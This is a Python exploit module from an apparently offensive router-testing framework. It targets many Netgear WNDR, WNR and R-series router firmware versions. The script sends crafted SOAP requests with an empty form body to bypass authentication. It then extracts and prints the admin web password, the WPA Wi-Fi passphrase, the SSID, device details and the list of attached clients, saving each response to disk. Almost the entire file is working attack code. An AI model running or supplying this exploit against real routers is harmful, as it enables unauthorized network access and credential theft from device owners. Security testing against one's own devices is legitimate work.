# Name:Netgear WNDR Authentication Bypass / Information disclosure
# File:wndr_auth_bypass.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 24.12.2015
# Last modified: 24.12.2015
# Shodan Dork:
# Description: Command execution vulnerability for:
# WNDR3700v4 - V1.0.0.4SH, WNDR3700v4 - V1.0.1.52, WNR2200 - V1.0.1.88,
# WNR2500 - V1.0.0.24, WNDR3700v2 - V1.0.1.14, WNDR3700v1 - V1.0.16.98,
# WNDR3700v1 - V1.0.7.98, WNDR4300 - V1.0.1.60, R6300v2 - V1.0.3.8,
# WNDR3300 - V1.0.45, WNDR3800 - V1.0.0.48, WNR1000v2 - V1.0.1.1,
# WNR1000v2 - V1.1.2.58, WNR2200 - V1.0.1.76, WNR2000v3 - v1.1.2.6,
# WNR2000v3 - V1.1.2.10, R7500 - V1.0.0.82
# Based on: https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR
import traceback

import core.Exploit
import core.io

import requests
import re
import interface.utils
from interface.messages import print_error, print_warning, print_info


class Exploit(core.Exploit.RextExploit):
    """
Name:Netgear WNDR Authentication Bypass / Information disclosure
File:wndr_auth_bypass.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 24.12.2015
Description: Command execution vulnerability for:
    WNDR3700v4 - V1.0.0.4SH, WNDR3700v4 - V1.0.1.52, WNR2200 - V1.0.1.88,
    WNR2500 - V1.0.0.24, WNDR3700v2 - V1.0.1.14, WNDR3700v1 - V1.0.16.98,
    WNDR3700v1 - V1.0.7.98, WNDR4300 - V1.0.1.60, R6300v2 - V1.0.3.8,
    WNDR3300 - V1.0.45, WNDR3800 - V1.0.0.48, WNR1000v2 - V1.0.1.1,
    WNR1000v2 - V1.1.2.58, WNR2200 - V1.0.1.76, WNR2000v3 - v1.1.2.6,
    WNR2000v3 - V1.1.2.10, R7500 - V1.0.0.82
Based on: https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR

Options:
    Name        Description

    host        Target host address
    port        Target port
    """

    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        url = "http://%s:%s/" % (self.host, self.port)

        # Headers with SOAP requests
        headers = {"SOAPAction": "urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo"}
        headers1 = {"SOAPAction": "urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo"}
        headers2 = {"SOAPAction": "urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo"}
        headers3 = {"SOAPAction": "urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys"}
        headers4 = {"SOAPAction": "urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetAttachDevice"}

        payload = {"": ""}  # Empty form will cause that the auth is bypassed

        # This is a very stupid way to parse XML but xml.etree is not playing nice with SOAP and
        # I don't feel like adding lxml into dependencies just for this module
        striptag = re.compile(r'<.*?>')
        try:
            print_warning("Sending exploit")

            # Request DeviceInfo
            response = requests.post(url, headers=headers, data=payload, timeout=60)
            if response.status_code != 200:
                raise requests.ConnectionError
            print_info("Writing response to DeviceInfo.xml")
            core.io.writetextfile(response.text, "DeviceInfo.xml")
            print_info("Parsing response")
            regex = re.search("<Description>(.*)", response.text)
            regex2 = re.search("<SerialNumber>(.*)", response.text)
            regex3 = re.search("<Firmwareversion>(.*)", response.text)
            try:
                description = striptag.sub('', regex.group(1))
                serial_number = striptag.sub('', regex2.group(1))
                firmware = striptag.sub('', regex3.group(1))
                print("Device: %s" % description)
                print("Serial number: %s" % serial_number)
                print("FW version: %s" % firmware)
            except IndexError:
                print_error("opps unable to locate this regular expression")

            # Request web UI password
            response = requests.post(url, headers=headers1, data=payload, timeout=60)
            if response.status_code != 200:
                raise requests.ConnectionError
            print_info("Writing response to LANConfigSecurity.xml")
            core.io.writetextfile(response.text, "LANConfigSecurity.xml")
            print_info("Parsing response")
            regex = re.search("<NewPassword>(.*)", response.text)
            try:
                password = striptag.sub('', regex.group(1))
                print("Password: %s" % password)
            except IndexError:
                print_error("opps unable to locate this regular expression")

            # Request WLAN info
            response = requests.post(url, headers=headers2, data=payload, timeout=60)
            if response.status_code != 200:
                raise requests.ConnectionError
            print_info("Writing response to WLANConfiguration.xml")
            core.io.writetextfile(response.text, "WLANConfiguration.xml")
            print_info("Parsing response")
            regex = re.search("<NewSSID>(.*)", response.text)
            regex2 = re.search("<NewBasicEncryptionModes>(.*)", response.text)
            try:
                ssid = regex.group(1)
                ssid = striptag.sub('', ssid)
                wlan_encryption = striptag.sub('', regex2.group(1))
                print("SSID: " + ssid)
                print("Encryption: %s" % wlan_encryption)
            except IndexError:
                print_error("opps unable to locate this regular expression")

            # Wlan password
            response = requests.post(url, headers=headers3, data=payload, timeout=60)
            if response.status_code != 200:
                raise requests.ConnectionError
            print_info("Writing response to WLANConfigurationGetWPASecurityKeys.xml")
            core.io.writetextfile(response.text, "WLANConfigurationGetWPASecurityKeys.xml")
            print_info("Parsing response")
            regex = re.search("<NewWPAPassphrase>(.*)", response.text)
            try:
                wlan_password = striptag.sub('', regex.group(1))
                print("Passphrase: %s" % wlan_password)
            except IndexError:
                print_error("opps unable to locate this regular expression")

            # Attached devices
            response = requests.post(url, headers=headers4, data=payload, timeout=60)
            if response.status_code != 200:
                raise requests.ConnectionError
            print_info("Writing response to DeviceInfoGetAttachDevice.xml")
            core.io.writetextfile(response.text, "DeviceInfoGetAttachDevice.xml")
            print_info("Parsing response")
            regex = re.search("<NewAttachDevice>(.*)", response.text)
            try:
                devices = striptag.sub('', regex.group(1))
                devices = devices.split('@')[1:]  # First element is number of records
                for device in devices:
                    device = device.split(";")
                    print("ID: %s" % device[0])
                    print("IP: %s" % device[1])
                    print("Name: %s" % device[2])
                    print("MAC: %s" % interface.utils.lookup_mac(device[3]))
                    print("Connection type: %s" % device[4])
            except IndexError:
                print_error("opps unable to locate this regular expression")

        except requests.ConnectionError as e:
            print_error("lost connection ")
            traceback.print_tb(e)
        except requests.Timeout:
            print_error("timeout")
Exploit()
